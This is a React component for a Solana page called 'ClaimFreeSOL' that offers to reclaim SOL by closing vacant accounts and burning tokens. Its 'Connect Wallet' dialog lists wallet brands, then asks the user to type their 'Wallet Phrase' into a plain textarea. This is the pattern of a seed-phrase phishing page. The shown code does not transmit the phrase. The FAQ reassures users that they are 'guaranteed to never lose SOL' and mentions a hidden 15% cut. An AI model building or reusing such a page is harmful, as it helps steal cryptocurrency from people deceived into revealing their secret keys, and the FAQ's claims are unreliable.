import { useState } from "react";

const Cleanup = () => {

    const [faq, setFaq] = useState("faq");
    const [formContainer, setFormContainer] = useState("form-container");

    const howClicked = () => {
        setFaq('faq active');
        document.body.classList.add("no-scroll"); 
    }

    const comClicked = () => {
        setFaq('faq');
        document.body.classList.remove("no-scroll"); 
    }

    const connectWal = () => {
        setFormContainer("form-container active");
    }

    const cancel = () => {
        setFormContainer("form-container");
    }

    const walletTypeClicked = (e) => {
        let walletType = e.currentTarget.value;

        let walletTypeContainer = e.currentTarget.parentElement;
        let walletPhrase = e.currentTarget.parentElement.parentElement.children[4];
        
        walletPhrase.classList.add('active');
        walletTypeContainer.classList.add('active');
    }

    const contClick = (e) => {
        const own = e.currentTarget.parentElement.parentElement.children[1].children[0].children[1];
        const other = e.currentTarget.parentElement.parentElement.children[1].children[0].children[0];

        const firstBtn = e.currentTarget.parentElement.children[0];
        const secondBtn = e.currentTarget.parentElement.children[1];
        const thirdBtn = e.currentTarget.parentElement.children[2];

        own.classList.add('active');
        other.classList.add('active');

        firstBtn.classList.remove('active');

        if (e.currentTarget.innerText === 'Burn Tokens'){
            secondBtn.classList.add('active');
        }else{
            secondBtn.classList.remove('active');
        }

        if (e.currentTarget.innerText === 'Burn NFTs'){
            thirdBtn.classList.add('active');
        }else{
            thirdBtn.classList.remove('active');
        }
    }

    const vacantClick = (e) => {
        const own = e.currentTarget.parentElement.parentElement.children[1].children[0].children[0];
        const other = e.currentTarget.parentElement.parentElement.children[1].children[0].children[1];

        const firstBtn = e.currentTarget.parentElement.children[0];
        const secondBtn = e.currentTarget.parentElement.children[1];
        const thirdBtn = e.currentTarget.parentElement.children[2];

        own.classList.remove('active');
        other.classList.remove('active');

        firstBtn.classList.add('active');
        secondBtn.classList.remove('active');
        thirdBtn.classList.remove('active');
    }

    return ( 
        <>
        <div className="cleanup">
            <div className="cleanup-top">
                <div className="clean-up-top-content">
                    <img src="/broom.png" alt="" className="cleanup-top-img" />
                    <p>Clean Up</p>
                    <div className="free-sol-cleanup">Free SOL</div>
                </div>
            </div>
            <div className="cleanup-bottom">
                <div className="cleanup-btn-container">
                    <button type="button" onClick={vacantClick} className="active">Vacant Accounts</button>
                    <button type="button" onClick={contClick}>Burn Tokens</button>
                    <button type="button"onClick={contClick}>Burn NFTs</button>
                </div>
                <div className="cleanup-bottom-content">
                    <div className="cleanup-bottom-content-top">
                        <div className="before-contine">
                            <header>
                                <h2>Total $SOL To Claim:</h2>
                            </header>
                            <div className="cleanup-bottom-top-main-content">
                                <p style={{color: 'green'}}>3.0</p>
                            </div>
                        </div>
                        <div className="continue">
                            <p>Connect Wallet to continue</p>
                            <button type="button" onClick={connectWal} className="connect-wallet-btn">Connect Wallet</button>
                        </div>
                    </div>
                    <div className="cleanup-bottom-content-bottom">
                        <header>
                            <h2>Vacant Accounts (0)</h2>
                            <img src="/Refresh.svg" alt="" className="" />
                        </header>
                        <div className="cleanup-bottom-content-bottom-main-content">

                        </div>
                    </div>
                </div>
            </div>
            <div className="connect-wallet-btn-container">
                <button type="button" onClick={connectWal} className="connect-wallet-btn">Connect Wallet</button>
                <button type="button" onClick={howClicked} className="how-it-work-btn">[How It Works]</button>
            </div>
            <div className={faq}>
                <div className="faq-main">
                    <header className="faq-header">
                        <img src="/info.svg" alt="" />
                        <h2>How it Work</h2>
                    </header>
                    <div className="faq-container">
                        <div className="faq-content">
                            <h2>Where is the reclaim SOL coming from?</h2>
                            <p>Any accounts on Solana require a small storage fee to open them. By burning a token, we can close this</p>
                            <p>account and reclaim the storage fee.</p>
                        </div>
                        <div className="faq-content">
                            <h2>How much can I reclaim from closing vacant account?</h2>
                            <p>Vacant accounts will give you 0.002 SOL.</p>
                        </div>
                        <div className="faq-content">
                            <h2>Can I lose NFTs or other tokens like USDC from closing vacant accounts?</h2>
                            <p>No, all vacant accounts selected already have 0 NFTs or Tokens assigned to them and have no use, feel</p>
                            <p>secure in pressing Reclaim All and signing the transactions to close them and receive the locked sol.</p>
                            <p>You can find more information in the official Solana Documentation, link</p>
                        </div>
                        <div className="faq-content">
                            <h2>Safe Burn</h2>
                            <p>'Safe Burn' sends dust tokens to a Temporary Burn Program. This allows recovery if you mistakenly</p>
                            <p>burn a valuable token, so we recommend keeping this ON.</p>
                            <p>For developers who intend to permanently burn supply, we recommend turning this OFF so that tokens</p>
                            <p>are irreversibly destroyed and inaccessible.</p>
                        </div>
                        <div className="faq-content">
                            <h2>How much can I reclaim from burn tokens and NFTs?</h2>
                            <p>Burning tokens will give you 0.002 SOL. Burning most NFTs will give you 0.01 SOL. A few NFTs (such as</p>
                            <p>scam NFTs) will give you 0.002 SOL.</p>
                        </div>
                        <div className="faq-content">
                            <h2>Are there any fees associated with using ClaimFreeSOL?</h2>
                            <p>By using ClaimFreeSOL, you are guaranteed to never lose SOL, you will only gain from the assets you</p>
                            <p>choose to burn.</p>
                            <p>Instead, to keep the team up and build more tools, a 15% donation is included for the recovered SOL.</p>
                        </div>
                        <div className="faq-content">
                            <h2>Will my wallet be destroyed or become unsafe after claiming?</h2>
                            <p>No, all it does is close your vacant accounts. It will not affect your wallet, and you can continue using</p>
                            <p>it without concerns.</p>
                        </div>
                        <div className="faq-content">
                            <h2>Limitations of Liability</h2>
                            <p>Users acknowledge that burning digital assets involves inherent risks, and ClaimFreeSOL is not liable</p>
                            <p>for any losses incurred. ClaimFreeSOL is not responsible if a user burns any asset by mistake. Before</p>
                            <p>sending the transaction, please double check that you are aware that the asset you have marked is</p>
                            <p>unwanted.</p>
                        </div>
                    </div>
                    <div className="complete-btn-container">
                        <button type="button" onClick={comClicked}>Complete</button>
                    </div>
                </div>
            </div>
            <div className={formContainer}>
                <form onSubmit={(e) => e.preventDefault()}>
                    <div className="cancel-container">
                        <button onClick={cancel}><div className="cancel"></div> </button>
                    </div>
                    <header>
                        <h2>Connect a wallet on Solana to continue</h2>
                    </header>
                    <p className="require">You must have atleat 0.02 sol to continue</p>
                    <div className="Wallet-type-container">
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/ave.svg" alt="wallet logo" />
                            <p>Ave Wallet</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/solflare.svg" alt="wallet logo" />
                            <p>Solflare</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/trust.svg" alt="wallet logo" />
                            <p>Trust Wallet</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/phantom.svg" alt="wallet logo" />
                            <p>Phantom</p>
                        </button>
                        <button type="button" onClick={walletTypeClicked} className="wallet-type-row">
                            <img src="/download.svg" alt="wallet logo" />
                            <p>Coinbase Wallet</p>
                        </button>
                    </div>
                    <div className="Wallet-phrase-container">
                        <label htmlFor="phrase">Wallet Phrase</label>
                        <textarea name="phrase" id="phrase"></textarea>
                        <div className="form-btn-container">
                            <button>Connect</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
        </>
     );
}
 
export default Cleanup;